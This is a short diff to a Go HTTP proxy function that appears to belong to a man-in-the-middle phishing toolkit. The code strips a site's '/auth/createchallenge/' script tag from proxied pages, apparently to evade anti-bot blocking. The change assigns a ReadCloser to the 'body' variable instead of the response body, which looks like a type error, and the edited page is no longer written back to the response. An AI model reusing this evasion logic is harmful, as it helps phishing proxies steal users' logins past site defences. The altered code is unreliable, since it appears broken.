@@ -1137,12 +1137,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			    modifiedBody := regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), "")
 			    log.Info("Change potential blocks")
 			    // Restore the modified body to the response
-			    resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(modifiedBody)))
+			    body = ioutil.NopCloser(bytes.NewBuffer([]byte(modifiedBody)))
 			    resp.ContentLength = int64(len(modifiedBody))
 			    resp.Header.Set("Content-Length", strconv.Itoa(len(modifiedBody)))
 			} else {
 			    // Restore the original body to the response
-			    resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+			    body = ioutil.NopCloser(bytes.NewBuffer(body))
 			}
 
 			if pl != nil {
